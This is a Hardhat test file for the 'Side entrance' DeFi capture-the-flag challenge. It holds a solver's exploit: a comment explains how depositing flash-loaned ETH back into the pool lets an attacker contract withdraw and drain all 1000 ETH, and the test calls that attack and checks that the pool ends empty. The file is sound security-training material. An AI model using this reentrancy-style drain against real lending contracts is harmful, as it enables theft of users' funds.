const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Side entrance', function () {

    let deployer, attacker;

    const ETHER_IN_POOL = ethers.utils.parseEther('1000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const SideEntranceLenderPoolFactory = await ethers.getContractFactory('SideEntranceLenderPool', deployer);
        this.pool = await SideEntranceLenderPoolFactory.deploy();
        
        await this.pool.deposit({ value: ETHER_IN_POOL });

        this.attackerInitialEthBalance = await ethers.provider.getBalance(attacker.address);

        const FlashloanEtherReceiverFactory = await ethers.getContractFactory('FlashLoanEtherReceiver', attacker);
        this.receiver = await FlashloanEtherReceiverFactory.deploy(this.pool.address, attacker.address);

        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.equal(ETHER_IN_POOL);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        /* Description goal is You must take all ETH from the lending pool.
        In the function 'flashLoan' we found vulnerability because it care only balance not owner
        and callback to the execute function outside here
        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        So, we create 'FlashLoanEtherReceiver' contract which contain execute function for callback inside 
        flashloan function and have fallback to receive ETH as receive() when withdraw money

        Step1: attacker call flashloan() to ask for loan money all of pool balance
        Step2: The SideEntranceLenderPool contract call the execute function inside attacker contract and then
        the balance of attacker change 
        Step3: attacker ask for withdraw all money to the attacker contract (trigger the receive fallback func.)
        Step4: attacker transfer all of attacker contract balance to attacker balance.
        */

        console.log("Before exploit");
        let poolBalance = await ethers.provider.getBalance(this.pool.address);
        console.log("Pool balance :" + ethers.utils.formatEther(poolBalance.toString()));  
        let attackerBalance = await ethers.provider.getBalance(attacker.address);
        console.log("Attacker balance :" + ethers.utils.formatEther(attackerBalance.toString())); 

        await this.receiver.executeFlashLoanAttack();

        console.log("After exploit");
        poolBalance = await ethers.provider.getBalance(this.pool.address);
        console.log("Pool balance :" + ethers.utils.formatEther(poolBalance.toString()));  
        attackerBalance = await ethers.provider.getBalance(attacker.address);
        console.log("Attacker balance :" + ethers.utils.formatEther(attackerBalance.toString()));
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.be.equal('0');
        
        // Not checking exactly how much is the final balance of the attacker,
        // because it'll depend on how much gas the attacker spends in the attack
        // If there were no gas costs, it would be balance before attack + ETHER_IN_POOL
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(this.attackerInitialEthBalance);
    });
});
